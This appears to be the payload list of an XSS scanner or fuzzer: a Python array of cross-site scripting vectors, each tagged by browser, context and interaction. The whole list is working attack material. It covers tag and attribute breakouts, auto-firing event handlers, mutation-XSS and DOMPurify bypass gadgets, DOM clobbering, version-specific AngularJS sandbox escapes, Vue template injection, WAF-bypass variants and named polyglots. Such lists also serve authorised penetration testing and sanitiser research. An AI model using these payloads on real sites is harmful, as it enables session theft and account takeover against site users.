...
vectors = [	{ 'payload':'''">PAYLOAD''',
		...
		{ 'payload':'''<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:PAYLOAD">]]</C><X></xml>''',
		  'browser':"""[IE6.0|NS8.1-IE]"""},
        { 'payload':"""<script athex>/*<script* */alert(PAYLOAD)</script""",
        ...
        { 'payload':"""&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(PAYLOAD)>OnMouseOver""",
          'browser':"""[Opera|FF2.0]"""},
        { 'payload':"""<svg><script athex> alert(PAYLOAD)""",
          'browser':"""[Opera]"""},
        ...
        { 'payload':"""<body/onload=&lt;!--&gt;&#10alert(PAYLOAD)>""",
          'browser':"""[Chrome]"""},
        { 'payload':"""<img src ?athex?\\/onerror = alert(PAYLOAD)""",
          'browser':"""[Chrome]"""},
    ...
    { 'payload':'''htmlStr = '<a href="javascript:alert(PAYLOAD)">Y</a>'; document.getElementById('body').innerHTML = htmlStr; try { if(document.getElementById('body').firstChild.protocol === 'javascript:') { alert(PAYLOAD); } }catch(e){alert(PAYLOAD);};''',
        ...
        { 'payload':'''<form><button formaction=javascript&colon;PAYLOAD>Y''',
          'browser':"""[Not Info]"""},
        { 'payload':"""<body onload=PAYLOAD>""",
          'browser':"""[HTML5][no-interaction]"""},
        { 'payload':"""<body onpageshow=PAYLOAD>""",
          'browser':"""[HTML5][no-interaction][also fires from bfcache]"""},
        { 'payload':"""<xss oncontentvisibilityautostatechange=PAYLOAD style="display:block;content-visibility:auto">""",
          'browser':"""[HTML5][no-interaction][Chrome 105+]"""},
        { 'payload':"""<input type=hidden oncontentvisibilityautostatechange=PAYLOAD style="content-visibility:auto">""",
          'browser':"""[HTML5][no-interaction][hidden input]"""},
        { 'payload':"""<xss id=x onbeforematch=PAYLOAD hidden=until-found>""",
          'browser':"""[HTML5][beforematch][needs find-in-page / #:~:text fragment][Chrome 102+]"""},
        { 'payload':"""<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart=PAYLOAD></xss>""",
          'browser':"""[CSS-animation][no-interaction]"""},
        { 'payload':"""<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend=PAYLOAD></xss>""",
          'browser':"""[CSS-animation][no-interaction]"""},
        { 'payload':"""<style>@keyframes x{from{}to{}}</style><xss style="animation:x 1s 2" onanimationiteration=PAYLOAD></xss>""",
          'browser':"""[CSS-animation][no-interaction]"""},
        { 'payload':"""<xss onfocus=PAYLOAD autofocus tabindex=1></xss>""",
          'browser':"""[autofocus][no-interaction]"""},
        { 'payload':"""<input autofocus onfocus=PAYLOAD>""",
          'browser':"""[autofocus][no-interaction]"""},
        { 'payload':"""<input autofocus onfocusin=PAYLOAD>""",
          'browser':"""[focusin][no-interaction via autofocus]"""},
        { 'payload':"""<select autofocus onfocus=PAYLOAD><option>x</option></select>""",
          'browser':"""[autofocus][no-interaction]"""},
        { 'payload':"""<textarea autofocus onfocus=PAYLOAD></textarea>""",
          'browser':"""[autofocus][no-interaction]"""},
        { 'payload':"""<button popovertarget=x>x</button><xss id=x popover onbeforetoggle=PAYLOAD>a</xss>""",
          'browser':"""[popover][beforetoggle][WAF-bypass][interaction: click or chained to existing popup]"""},
        { 'payload':"""<button popovertarget=x>x</button><xss id=x popover ontoggle=PAYLOAD>a</xss>""",
          'browser':"""[popover][toggle][WAF-bypass]"""},
        { 'payload':"""<video autoplay muted onplay=PAYLOAD><source src=validvideo.mp4 type=video/mp4></video>""",
          'browser':"""[media-autoplay][no-interaction]"""},
        { 'payload':"""<video autoplay muted onplaying=PAYLOAD><source src=validvideo.mp4 type=video/mp4></video>""",
          'browser':"""[media-autoplay][no-interaction]"""},
        { 'payload':"""<video onstalled=PAYLOAD src=x>""",
          'browser':"""[media][no-interaction][invalid src stalls -> fires]"""},
        { 'payload':"""<audio autoplay onplay=PAYLOAD><source src=validaudio.wav type=audio/wav></audio>""",
          'browser':"""[media-autoplay][no-interaction]"""},
        { 'payload':"""<audio onsuspend=PAYLOAD src=x>""",
          'browser':"""[media][no-interaction][fires once loaded][WAF-bypass]"""},
        { 'payload':"""<audio src onerror=PAYLOAD>""",
          'browser':"""[media][no-interaction]"""},
        { 'payload':"""<xss onscrollend=PAYLOAD style="display:block;overflow:auto;width:100px;height:50px"><br><br><br><br></xss>""",
          'browser':"""[HTML5][interaction: scroll]"""},
        { 'payload':"""<body onscroll=PAYLOAD><div style=height:2000px></div>""",
          'browser':"""[HTML5][interaction: scroll]"""},
        { 'payload':"""<xss onpointerenter=PAYLOAD style=display:block>x</xss>""",
          'browser':"""[pointer-events][interaction: hover]"""},
        { 'payload':"""<xss onpointerover=PAYLOAD style=display:block>x</xss>""",
          'browser':"""[pointer-events][interaction: hover]"""},
        { 'payload':"""<xss onauxclick=PAYLOAD style=display:block>x</xss>""",
          'browser':"""[pointer-events][interaction: middle/right-click]"""},
        { 'payload':"""<svg onload=PAYLOAD>""",
          'browser':"""[SVG][no-interaction]"""},
        { 'payload':"""<svg><script>PAYLOAD</script></svg>""",
          'browser':"""[SVG][no-interaction][inline svg script]"""},
        { 'payload':"""<svg><script href=data:,PAYLOAD />""",
          'browser':"""[SVG][no-interaction][svg script XLink href]"""},
        { 'payload':"""<svg><animate onbegin=PAYLOAD attributeName=x dur=1s>""",
          'browser':"""[SVG-SMIL][no-interaction]"""},
        { 'payload':"""<svg><animate onend=PAYLOAD attributeName=x dur=1s>""",
          'browser':"""[SVG-SMIL][no-interaction]"""},
        { 'payload':"""<svg><animate onrepeat=PAYLOAD attributeName=x dur=1s repeatCount=2>""",
          'browser':"""[SVG-SMIL][no-interaction]"""},
        { 'payload':"""<svg><set onbegin=PAYLOAD attributeName=x to=1 dur=1s>""",
          'browser':"""[SVG-SMIL][no-interaction]"""},
        { 'payload':"""<svg><animateTransform onbegin=PAYLOAD attributeName=transform dur=1s>""",
          'browser':"""[SVG-SMIL][no-interaction]"""},
        { 'payload':"""<svg><animateMotion onbegin=PAYLOAD dur=1s>""",
          'browser':"""[SVG-SMIL][no-interaction]"""},
        { 'payload':"""<svg><image href=1 onerror=PAYLOAD>""",
          'browser':"""[SVG][no-interaction][broken image]"""},
        { 'payload':"""<svg><a xlink:href="javascript:PAYLOAD"><text x=20 y=20>CLICK</text></a></svg>""",
          'browser':"""[SVG][interaction: click][js-uri]"""},
        { 'payload':"""<svg><animate attributeName=href values=javascript:PAYLOAD /><a><text x=20 y=20>CLICK</text></a></svg>""",
          'browser':"""[SVG][interaction: click][animated href]"""},
        { 'payload':"""<math><maction xlink:href="javascript:PAYLOAD" actiontype="statusline">CLICK</maction></math>""",
          'browser':"""[MathML][interaction: click][legacy FF]"""},
        { 'payload':"""<details open ontoggle=PAYLOAD>test</details>""",
          'browser':"""[details][no-interaction][open auto-fires toggle]"""},
        { 'payload':"""<video><source onerror=PAYLOAD></video>""",
          'browser':"""[source-onerror][no-interaction]"""},
        { 'payload':"""<audio><source onerror=PAYLOAD></audio>""",
          'browser':"""[source-onerror][no-interaction]"""},
        { 'payload':"""<marquee onstart=PAYLOAD>x</marquee>""",
          'browser':"""[marquee][no-interaction][legacy but still parses]"""},
        { 'payload':"""<iframe srcdoc="<svg onload=PAYLOAD>"></iframe>""",
          'browser':"""[iframe-srcdoc][no-interaction]"""},
        { 'payload':"""<iframe srcdoc="&lt;script&gt;PAYLOAD&lt;/script&gt;"></iframe>""",
          'browser':"""[iframe-srcdoc][no-interaction][entity-encoded]"""},
        { 'payload':"""<object data="data:text/html,<script>PAYLOAD</script>"></object>""",
          'browser':"""[object-data][no-interaction][data-uri]"""},
        { 'payload':"""<object data="javascript:PAYLOAD"></object>""",
          'browser':"""[object-data][js-uri][legacy FF]"""},
        { 'payload':"""<embed src="data:text/html,<script>PAYLOAD</script>">""",
          'browser':"""[embed][no-interaction][data-uri]"""},
        { 'payload':"""<frameset onload=PAYLOAD>""",
          'browser':"""[frameset][no-interaction][legacy]"""},
        { 'payload':"""<input type=image src=x onerror=PAYLOAD>""",
          'browser':"""[input-image][no-interaction][broken image]"""},
        { 'payload':"""<dialog open onclose=PAYLOAD><form method=dialog><button autofocus>x</button></form></dialog>""",
          'browser':"""[dialog][interaction: ESC/close]"""},
        { 'payload':"""<template shadowrootmode=open><slot onslotchange=PAYLOAD></slot></template><span>x</span>""",
          'browser':"""[declarative-shadow-DOM][no-interaction][experimental]"""},
        { 'payload':"""<portal src="javascript:PAYLOAD"></portal>""",
          'browser':"""[portal][js-uri][experimental/deprecated Chrome]"""},
        { 'payload':"""<button formaction="javascript:PAYLOAD">CLICK</button>""",
          'browser':"""[formaction][interaction: click][js-uri]"""},
        { 'payload':"""<iframe src="javascript:PAYLOAD"></iframe>""",
          'browser':"""[js-uri][no-interaction]"""},
        { 'payload':"""<iframe src="data:text/html,<script>PAYLOAD</script>"></iframe>""",
          'browser':"""[data-uri][no-interaction]"""},
        { 'payload':"""<iframe src="data:text/html,<svg/onload=PAYLOAD>"></iframe>""",
          'browser':"""[data-uri][no-interaction]"""},
        { 'payload':"""<a href="javascript:PAYLOAD">CLICK</a>""",
          'browser':"""[js-uri][interaction: click]"""},
        { 'payload':"""<form action="javascript:PAYLOAD"><input type=submit></form>""",
          'browser':"""[js-uri][interaction: submit]"""},
        { 'payload':"""<script src="data:text/javascript,PAYLOAD"></script>""",
          'browser':"""[data-uri][no-interaction][script src]"""},
        { 'payload':"""<script type=module src="data:text/javascript,PAYLOAD"></script>""",
          'browser':"""[data-uri][no-interaction][ES module src]"""},
        { 'payload':"""<script>import('data:text/javascript,PAYLOAD')</script>""",
          'browser':"""[dynamic-import][no-interaction]"""},
        { 'payload':"""<script type=module>import('data:text/javascript,PAYLOAD')</script>""",
          'browser':"""[dynamic-import][no-interaction]"""},
        { 'payload':"""<img src=x onerror="import('data:text/javascript,PAYLOAD')">""",
          'browser':"""[dynamic-import][no-interaction][import from event handler]"""},
        { 'payload':"""<noscript><p title="</noscript><img src=x onerror=PAYLOAD>"></noscript>""",
          'browser':"""[mXSS][noscript][script-on vs off parse diff]"""},
        { 'payload':"""<noembed><img title="</noembed><img src=x onerror=PAYLOAD>"></noembed>""",
          'browser':"""[mXSS][noembed][innerHTML re-parse]"""},
        { 'payload':"""<xmp><p title="</xmp><img src=x onerror=PAYLOAD>"></xmp>""",
          'browser':"""[mXSS][xmp][innerHTML re-parse]"""},
        { 'payload':"""<form><math><mtext></form><form><mglyph><style></math><img src onerror=PAYLOAD>""",
          'browser':"""[mXSS][MathML namespace confusion][DOMPurify < 2.0.17]"""},
        { 'payload':"""<math><annotation-xml encoding="text/html"><style></style><img src=x onerror=PAYLOAD></annotation-xml></math>""",
          'browser':"""[mXSS][annotation-xml HTML integration point]"""},
        { 'payload':"""<svg></p><style><a id="</style><img src=1 onerror=PAYLOAD>"></svg>""",
          'browser':"""[mXSS][SVG/HTML namespace confusion]"""},
        { 'payload':"""<svg><p><style><g title="</style><img src onerror=PAYLOAD>"></style></svg>""",
          'browser':"""[mXSS][SVG namespace confusion][DOMPurify < 2.2.2]"""},
        { 'payload':"""<svg><foreignObject><iframe srcdoc="<img src=x onerror=PAYLOAD>"></iframe></foreignObject></svg>""",
          'browser':"""[mXSS][foreignObject -> HTML context]"""},
        { 'payload':"""<table><math><style><img src=x onerror=PAYLOAD></style></math></table>""",
          'browser':"""[mXSS][foster-parenting out of table]"""},
        { 'payload':"""<style><!--</style><img src=x onerror=PAYLOAD>-->""",
          'browser':"""[mXSS][style innerHTML comment confusion]"""},
        { 'payload':"""<a id=x href="javascript:PAYLOAD">""",
          'browser':"""[DOM-clobbering][clobbers window.x][gadget: location=x / a.href sink]"""},
        { 'payload':"""<a id=x name=y href="javascript:PAYLOAD"><a id=x>""",
          'browser':"""[DOM-clobbering][clobbers x.y HTMLCollection]"""},
        { 'payload':"""<form id=x><output id=y>PAYLOAD</output></form>""",
          'browser':"""[DOM-clobbering][clobbers x.y.value string][gadget: eval(x.y.value)]"""},
        { 'payload':"""<iframe name=a srcdoc="<a id=c name=d href=cid:PAYLOAD>x</a><a id=c>" name=b></iframe>""",
          'browser':"""[DOM-clobbering][clobbers a.b.c.d deep chain]"""},
        { 'payload':"""<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:x&quot;onerror=PAYLOAD//">""",
          'browser':"""[DOM-clobbering][DOMPurify default-config bypass gadget]"""},
        { 'payload':"""#<img src=x onerror=PAYLOAD>""",
          'browser':"""[DOM-sink][source: location.hash][sink: element.innerHTML]"""},
        { 'payload':"""<img src=x onerror=PAYLOAD>""",
          'browser':"""[DOM-sink][sink: document.write() / innerHTML]"""},
        { 'payload':"""javascript:PAYLOAD""",
          'browser':"""[DOM-sink][sink: location = source]"""},
        { 'payload':"""';PAYLOAD;//""",
          'browser':"""[DOM-sink][sink: eval()/setTimeout(string)/Function()]"""},
        { 'payload':"""<div ng-app>{{constructor.constructor('PAYLOAD')()}}</div>""",
          'browser':"""[AngularJS 1.0.x-1.1.5 / 1.6+ no-sandbox][wrap with ng-app if needed]"""},
        { 'payload':"""{{constructor.constructor('PAYLOAD')()}}""",
          'browser':"""[AngularJS 1.0.0-1.1.5]"""},
        { 'payload':"""{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'PAYLOAD')()}}""",
          'browser':"""[AngularJS 1.2.0-1.2.1]"""},
        { 'payload':"""{{a="a"["constructor"].prototype;a.charAt=a.trim;$eval('a",PAYLOAD,"')}}""",
          'browser':"""[AngularJS 1.2.2-1.2.5 / 1.2.24-1.2.32]"""},
        { 'payload':"""{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'PAYLOAD')()}}""",
          'browser':"""[AngularJS 1.2.6-1.2.18]"""},
        { 'payload':"""{{c=toString.constructor;p=c.prototype;p.toString=p.call;["PAYLOAD","a"].sort(c)}}""",
          'browser':"""[AngularJS 1.2.19-1.2.23]"""},
        { 'payload':"""{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=''.valueOf;$eval('x=PAYLOAD//');}}""",
          'browser':"""[AngularJS 1.3.0-1.3.2]"""},
        { 'payload':"""{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,PAYLOAD,a')}}""",
          'browser':"""[AngularJS 1.3.0-1.5.8]"""},
        { 'payload':"""{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=PAYLOAD//');}}""",
          'browser':"""[AngularJS 1.3.3-1.3.18]"""},
        { 'payload':"""{{'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=PAYLOAD//');}}""",
          'browser':"""[AngularJS 1.3.19]"""},
        { 'payload':"""{{'a'.constructor.prototype.charAt=[].join;$eval('x=PAYLOAD');}}""",
          'browser':"""[AngularJS 1.3.20]"""},
        { 'payload':"""{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };PAYLOAD//');}}""",
          'browser':"""[AngularJS 1.4.0-1.4.14]"""},
        { 'payload':"""{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=PAYLOAD');}}""",
          'browser':"""[AngularJS 1.4.10-1.5.8]"""},
        { 'payload':"""{{c=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply;c.$eval=b;op=$root.$$phase;$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;C=c.$apply(c);$root.$$phase=op;$root.$digest=od;B=C(b,c,b);$evalAsync("astNode=pop();astNode.type='UnaryExpression';astNode.operator='(window.X?void0:(window.X=true,PAYLOAD))+';astNode.argument={type:'Identifier',name:'foo'};");m1=B($$asyncQueue.pop().expression,null,$root);m2=B(C,null,m1);[].push.apply=m2;a=''.sub;$eval('a(b.c)');[].push.apply=a;}}""",
          'browser':"""[AngularJS 1.5.9-1.5.11]"""},
        { 'payload':"""{{[].pop.constructor('PAYLOAD')()}}""",
          'browser':"""[AngularJS 1.6.0-1.6.5]"""},
        { 'payload':"""{{$eval.constructor('PAYLOAD')()}}""",
          'browser':"""[AngularJS 1.6+ generic no-sandbox]"""},
        { 'payload':"""<input ng-app ng-focus="$event.view.PAYLOAD" autofocus>""",
          'browser':"""[AngularJS 1.6+][ng-focus directive][no-interaction via autofocus]"""},
        { 'payload':"""{{_c.constructor('PAYLOAD')()}}""",
          'browser':"""[Vue 2 CSTI]"""},
        { 'payload':"""{{_v.constructor('PAYLOAD')()}}""",
          'browser':"""[Vue 2 CSTI]"""},
        { 'payload':"""{{_s.constructor('PAYLOAD')()}}""",
          'browser':"""[Vue 2 CSTI]"""},
        { 'payload':"""{{_createBlock.constructor('PAYLOAD')()}}""",
          'browser':"""[Vue 3 CSTI]"""},
        { 'payload':"""{{_createVNode.constructor('PAYLOAD')()}}""",
          'browser':"""[Vue 3 CSTI]"""},
        { 'payload':"""{{_Vue.h.constructor('PAYLOAD')()}}""",
          'browser':"""[Vue 3 CSTI]"""},
        { 'payload':"""<div v-html="'<img src=x onerror=PAYLOAD>'"></div>""",
          'browser':"""[Vue][v-html sink]"""},
        { 'payload':"""<script>PAYLOAD</script>""",
          'browser':"""[CSP-bypass][only if script-src has unsafe-inline]"""},
        { 'payload':"""jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcliCk=PAYLOAD )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=PAYLOAD//>\\x3e""",
          'browser':"""[polyglot][0xsobky ultimate]"""},
        { 'payload':"""" onclick=PAYLOAD//<button ' onclick=PAYLOAD//> */ PAYLOAD//""",
          'browser':"""[polyglot][Mathias Karlsson]"""},
        { 'payload':"""javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*<svg/*/onload=PAYLOAD//>""",
          'browser':"""[polyglot][innerht.ml challenge]"""},
        { 'payload':"""javascript:`//"//\\"//</title></textarea></style></noscript></noembed></script></template><svg/onload='/*--><html */ onmouseover=PAYLOAD//'>""",
          'browser':"""[polyglot][innerht.ml challenge]"""},
        { 'payload':"""JavaScript://%250APAYLOAD//'/*\\'/*"/*\\"/*`/*\\`/*&apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(PAYLOAD)}//><Base/Href=//X55.is\\76-->""",
          'browser':"""[polyglot][Brutelogic]"""},
        { 'payload':"""-->'"/></sCript><svG x=">" onload=PAYLOAD//>""",
          'browser':"""[polyglot][s0md3v]"""},
        { 'payload':"""<svg%0Aonload=%09PAYLOAD//""",
          'browser':"""[polyglot][s0md3v][whitespace-obfuscated]"""},
        { 'payload':"""';PAYLOAD//';PAYLOAD//";PAYLOAD//";PAYLOAD//--></SCRIPT>">'><SCRIPT>PAYLOAD</SCRIPT>""",
          'browser':"""[polyglot][RSnake classic multi-context]"""},
        { 'payload':"""">><marquee><img src=x onerror=PAYLOAD></marquee>"></plaintext\\></|\\><plaintext/onmouseover=PAYLOAD></script><script>PAYLOAD</script>'-->"></script><script>PAYLOAD</script>""",
          'browser':"""[polyglot][Ashar Javed aggressive]"""},
        { 'payload':'''" autofocus onfocus=PAYLOAD x="''',
          'browser':"""[attr-breakout][no-interaction][breaks double-quoted attr + autofire]"""},
        { 'payload':"""' autofocus onfocus=PAYLOAD x='""",
          'browser':"""[attr-breakout][no-interaction][single-quoted attr]"""},
        { 'payload':""""><svg onload=PAYLOAD>""",
          'browser':"""[tag-breakout][no-interaction]"""},
        { 'payload':""""><img src=x onerror=PAYLOAD>""",
          'browser':"""[tag-breakout][no-interaction]"""},
        { 'payload':""""><input autofocus onfocus=PAYLOAD>""",
          'browser':"""[tag-breakout][no-interaction]"""},
        { 'payload':""""><details open ontoggle=PAYLOAD>""",
          'browser':"""[tag-breakout][no-interaction]"""},
        { 'payload':""""><video><source onerror=PAYLOAD>""",
          'browser':"""[tag-breakout][no-interaction]"""},
        { 'payload':""""><script>PAYLOAD</script>""",
          'browser':"""[tag-breakout][no-interaction]"""},
        { 'payload':'''" onmouseover=PAYLOAD x="''',
          'browser':"""[attr-breakout][interaction: hover]"""},
        { 'payload':"""'-PAYLOAD-'""",
          'browser':"""[JS-string-breakout][no-interaction][inside var x='...']"""},
        { 'payload':"""';PAYLOAD//""",
          'browser':"""[JS-string-breakout][no-interaction]"""},
        { 'payload':"""</script><svg onload=PAYLOAD>""",
          'browser':"""[script-block-breakout][no-interaction]"""},
        { 'payload':"""</title><svg onload=PAYLOAD>""",
          'browser':"""[rawtext-breakout][title][no-interaction]"""},
        { 'payload':"""</textarea><svg onload=PAYLOAD>""",
          'browser':"""[rawtext-breakout][textarea][no-interaction]"""},
        { 'payload':"""</style><svg onload=PAYLOAD>""",
          'browser':"""[rawtext-breakout][style][no-interaction]"""},
        { 'payload':"""<a href=# accesskey=X onclick=PAYLOAD>x</a>""",
          'browser':"""[accesskey][interaction: Alt+Shift+X / Alt+X shortcut]"""},
        { 'payload':'''" accesskey=X onclick=PAYLOAD x="''',
          'browser':"""[attr-breakout][accesskey][interaction: shortcut]"""},
        { 'payload':"""');PAYLOAD;//""",
          'browser':"""[js-string-breakout][call-arg][single-quote][no-interaction]"""},
        { 'payload':'''");PAYLOAD;//''',
          'browser':"""[js-string-breakout][call-arg][double-quote][no-interaction]"""},
        { 'payload':"""';PAYLOAD;//""",
          'browser':"""[js-string-breakout][single-quote][no-interaction]"""},
        { 'payload':'''";PAYLOAD;//''',
          'browser':"""[js-string-breakout][double-quote][no-interaction]"""},
        { 'payload':"""'-PAYLOAD-'""",
          'browser':"""[js-string-concat][single-quote][no-interaction]"""},
        { 'payload':'''"-PAYLOAD-"''',
          'browser':"""[js-string-concat][double-quote][no-interaction]"""},
        { 'payload':"""${PAYLOAD}""",
          'browser':"""[js-template-literal][no-interaction]"""},
        { 'payload':"""</script><script>PAYLOAD</script>""",
          'browser':"""[js-block-breakout][script][no-interaction]"""},
        { 'payload':"""javascript:PAYLOAD""",
          'browser':"""[uri-scheme][javascript][href/src sink][interaction: navigate]"""},
        { 'payload':"""javascript:PAYLOAD//""",
          'browser':"""[uri-scheme][javascript][comment-tail][interaction: navigate]"""},
        { 'payload':"""data:text/html,<script>PAYLOAD</script>""",
          'browser':"""[uri-scheme][data][href sink][no-interaction]"""},
        { 'payload':"""x' onerror='PAYLOAD""",
          'browser':"""[attr-breakout][single-quote][src sink][no-interaction]"""},
        { 'payload':'''x" onerror="PAYLOAD''',
          'browser':"""[attr-breakout][double-quote][src sink][no-interaction]"""},
        { 'payload':"""x onerror=PAYLOAD""",
          'browser':"""[attr-breakout][unquoted][src sink][no-interaction]"""},
        { 'payload':"""<svg><animate onbegin=PAYLOAD attributeName=x dur=1s>""",
          'browser':"""[HTML5][svg-animate][no-interaction]"""},
        { 'payload':"""<input autofocus onfocus=PAYLOAD>""",
          'browser':"""[HTML5][input-autofocus][no-interaction]"""},
        { 'payload':"""<select autofocus onfocus=PAYLOAD>""",
          'browser':"""[HTML5][select-autofocus][no-interaction]"""},
        { 'payload':"""<video><source onerror=PAYLOAD></video>""",
          'browser':"""[HTML5][video-source][no-interaction]"""},
        { 'payload':"""<marquee onstart=PAYLOAD>x</marquee>""",
          'browser':"""[HTML5][marquee][no-interaction]"""},
        { 'payload':"""<body onpageshow=PAYLOAD>""",
          'browser':"""[HTML5][onpageshow][no-interaction]"""},
        { 'payload':'''<iframe srcdoc="&lt;script&gt;PAYLOAD&lt;/script&gt;">''',
          'browser':"""[HTML5][iframe-srcdoc][no-interaction]"""},
        { 'payload':"""<img src=x:x onerror=PAYLOAD>""",
          'browser':"""[HTML5][img-onerror][no-interaction]"""},
        { 'payload':"""<xss id=x tabindex=1 onactivate=PAYLOAD></xss>""",
          'browser':"""[HTML5][onactivate][interaction: focus]"""},
		]
